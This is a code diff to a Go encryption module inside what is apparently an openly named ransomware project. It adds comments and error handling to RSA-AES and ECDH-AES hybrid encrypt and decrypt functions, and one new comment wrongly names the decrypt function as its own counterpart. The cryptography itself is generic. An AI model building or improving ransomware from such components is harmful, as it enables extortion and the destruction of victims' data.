@@ -11,7 +11,7 @@ import (
 	"ransomware/encryption/rsaLib"
 )
 
-// Generates random 16 byte AES key and encrypts message with it, encrypts the AES key
+// Generates random 32 byte AES key and encrypts message with it, encrypts the AES key
 // with RSA and then returns the encrypted AES key concatenated with the encrypted message
 func RSAAESEncrypt(msg []byte, publicKey *rsa.PublicKey) ([]byte, error) {
 
@@ -36,7 +36,7 @@ func RSAAESEncrypt(msg []byte, publicKey *rsa.PublicKey) ([]byte, error) {
 	return encrypted, nil
 }
 
-// Decrypts messages encrypted with Encrypt()
+// Decrypts messages encrypted with RSAAESEncrypt()
 func RSAAESDecrypt(msg []byte, privateKey *rsa.PrivateKey) ([]byte, error) {
 
 	aesKeyEncrypted, encryptedMessage := msg[:256], msg[256:]
@@ -51,6 +51,8 @@ func RSAAESDecrypt(msg []byte, privateKey *rsa.PrivateKey) ([]byte, error) {
 	return decrypted, nil
 }
 
+// Generates shared aes key with ECDH, then encrypts msg with it. Returns ECDH cipher public appended
+// to encrypted msg
 func ECDHAESEncrypt(msg []byte, publicKey *ecdsa.PublicKey) ([]byte, error) {
 
 	aesKey, cipherPublicKey, err := eccLib.ECDHGenerateEncryptionKey(publicKey)
@@ -70,6 +72,7 @@ func ECDHAESEncrypt(msg []byte, publicKey *ecdsa.PublicKey) ([]byte, error) {
 	return encrypted, nil
 }
 
+// Decrypts messages encrypted with ECDHAESDecrypt()
 func ECDHAESDecrypt(msg []byte, privateKey *ecdsa.PrivateKey) ([]byte, error) {
 
 	cipherPublicMarshal, encryptedMessage := msg[:33], msg[33:]
@@ -78,7 +81,10 @@ func ECDHAESDecrypt(msg []byte, privateKey *ecdsa.PrivateKey) ([]byte, error) {
 
 	cipherPublicKey := &ecdsa.PublicKey{Curve: eccLib.Curve, X: x, Y: y}
 
-	aesKey := eccLib.ECDHGenerateDecryptionKey(privateKey, cipherPublicKey)
+	aesKey, err := eccLib.ECDHGenerateDecryptionKey(privateKey, cipherPublicKey)
+	if err != nil {
+		return nil, err
+	}
 
 	decrypted, err := aesLib.DecryptAES(encryptedMessage, aesKey)
 	if err != nil {
